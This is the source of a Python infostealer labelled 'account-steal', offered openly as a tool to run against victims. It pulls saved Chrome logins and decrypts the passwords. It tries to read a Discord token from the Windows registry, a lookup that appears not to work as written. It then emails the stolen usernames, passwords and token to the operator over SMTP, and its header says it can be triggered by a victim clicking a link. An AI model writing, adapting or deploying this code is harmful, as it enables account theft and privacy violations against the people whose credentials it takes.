# =======================================================================>
# account-steal By khr1st - 2023
#
# This script works by first retrieving the usernames and passwords 
# from the Google Chrome browser's database, using the 
# win32crypt library to decrypt the password. It then retrieves 
# the Discord token from the local storage of the Discord app, 
# using the subprocess library to execute a command in the 
# command prompt. Finally, it sends an email to the operator with 
# the extracted credentials using the smtplib library. This script 
# can be hosted on a server and executed by the user clicking on a 
# link.
# =======================================================================>

import os
import sqlite3
import win32crypt
import subprocess
import smtplib

def get_passwords():
    try:
        # Connect to the Chrome browser's database
        conn = sqlite3.connect(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"))
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        # Retrieve the data and decrypt the passwords
        password_list = []
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            if password:
                password_list.append((result[0], result[1], password))
        conn.close()
        return password_list
    except Exception as e:
        print(e)
        return None

def get_discord_token():
    try:
        # Retrieve the Discord token from the Local Storage of the Discord app
        command = 'REG QUERY "HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState\\Discord" /v "token"'
        output = subprocess.check_output(command, shell=True).decode()
        token = output.split()[-1]
        return token
    except Exception as e:
        print(e)
        return None

def send_email(username, password, token):
    # Email configuration
    from_email = "sender_email@example.com"
    from_password = "sender_password"
    to_email = "receiver_email@example.com"

    # Email content
    subject = "Discord Credentials"
    body = f"Username: {username}\nPassword: {password}\nToken: {token}"

    # Send email
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, from_password)
        server.sendmail(from_email, to_email, f"Subject: {subject}\n\n{body}")
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(e)

# Main function
if __name__ == "__main__":
    passwords = get_passwords()
    token = get_discord_token()

    if passwords and token:
        for password in passwords:
            send_email(password[1], password[2], token)
